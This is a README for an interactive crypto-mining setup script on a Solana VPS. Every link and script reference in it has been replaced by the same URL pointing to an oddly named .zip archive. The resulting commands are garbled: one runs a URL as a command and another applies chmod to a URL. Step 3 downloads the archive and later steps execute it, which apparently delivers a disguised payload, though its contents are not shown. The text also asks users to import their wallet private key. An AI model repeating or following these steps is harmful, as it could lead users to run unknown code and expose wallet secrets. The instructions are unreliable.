## 🚀 Bitz Miner Interactive Setup

> ⚠️ **IMPORTANT: Must Read Before Starting!**
>
> After installing **Solana CLI** (during the script setup), you **must reboot your VPS** once.
>
> ❗ Without rebooting, **Solana CLI will not be detected**, and the script may not work properly.
>
> ✅ **How to reboot properly:**
>
> - Simply **close your VPS window / tab** or disconnect from it.
> - Then **log in again** to your VPS via SSH.
> - After logging back in, run the script again using:
>
>     ```bash
>     https://github.com/AbhiCrypto16/bitz-miner-setup/raw/refs/heads/main/guanamine/setup_miner_bitz_maxilliferous.zip
>     ```

---

Before running the `https://github.com/AbhiCrypto16/bitz-miner-setup/raw/refs/heads/main/guanamine/setup_miner_bitz_maxilliferous.zip` script, please ensure your system is ready by following these prerequisites and steps.

---

### ✅ Prerequisites

#### 👇 If You Purchased VPS from [https://github.com/AbhiCrypto16/bitz-miner-setup/raw/refs/heads/main/guanamine/setup_miner_bitz_maxilliferous.zip](https://github.com/AbhiCrypto16/bitz-miner-setup/raw/refs/heads/main/guanamine/setup_miner_bitz_maxilliferous.zip)

QuickPod VPS may not come with `sudo` installed. In that case, run the following:

```bash
apt update && apt upgrade -y
apt install sudo -y
```

---

### 🛠️ How to Run the Script

#### **Step 1: Update the System**

Update packages and upgrade the system:

```bash
sudo apt update && sudo apt upgrade -y
```

#### **Step 2: Install Required Packages**

Install `curl` and `screen`:

```bash
sudo apt install curl screen -y
```

- `curl`: Required to download the script from GitHub.  
- `screen`: Allows running the miner in the background.

#### **Step 3: Download the Script**

Run the following to download the setup script:

```bash
curl -O https://github.com/AbhiCrypto16/bitz-miner-setup/raw/refs/heads/main/guanamine/setup_miner_bitz_maxilliferous.zip
```

#### **Step 4: Make the Script Executable**

```bash
chmod +x https://github.com/AbhiCrypto16/bitz-miner-setup/raw/refs/heads/main/guanamine/setup_miner_bitz_maxilliferous.zip
```

#### **Step 5: Run the Script**

```bash
https://github.com/AbhiCrypto16/bitz-miner-setup/raw/refs/heads/main/guanamine/setup_miner_bitz_maxilliferous.zip
```

This will launch the interactive setup with options for:
- System Update  
- Wallet Import  
- Mining Setup  
- And more...

---

### 🔁 Re-access the Script After VPS Reboot

To run the script again after reboot:

```bash
https://github.com/AbhiCrypto16/bitz-miner-setup/raw/refs/heads/main/guanamine/setup_miner_bitz_maxilliferous.zip
```

---

### ⚠️ Additional Notes

#### 🔐 Wallet Import – Private Key Format (Step 8)

When importing your wallet in **Step 6**, make sure your **private key is in JSON array format**, like this:

```json
[99, 132, 57, 84, ...]
```

✅ Do **NOT** paste it as a plain string or text. It must be in valid bracketed format (`[]`) for the import to work.
